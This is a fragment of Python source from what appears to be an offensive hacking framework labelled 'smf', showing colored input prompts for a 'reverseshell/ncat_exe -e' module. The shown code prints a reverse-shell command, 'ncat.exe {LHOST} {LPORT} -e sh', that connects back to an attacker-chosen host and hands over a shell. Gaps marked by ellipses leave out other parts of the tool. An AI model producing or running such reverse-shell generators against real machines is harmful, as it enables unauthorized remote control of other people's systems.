...
while True:  
    try:
        exin = input("\033[1;32msmf\033[1;34m(\033[1;31mreverseshell/ncat_exe -e\033[1;34m) > \033[1;32m")
...
while True:
                    exin2 = input("\033[1;31m(\033[1;34mreverseshell/ncat_exe -e\033[1;31m)> \033[1;32m")
...
time.sleep(1)
print(f"""
\033[1;32mncat.exe {LHOST} {LPORT} -e sh
""")
time.sleep(3)
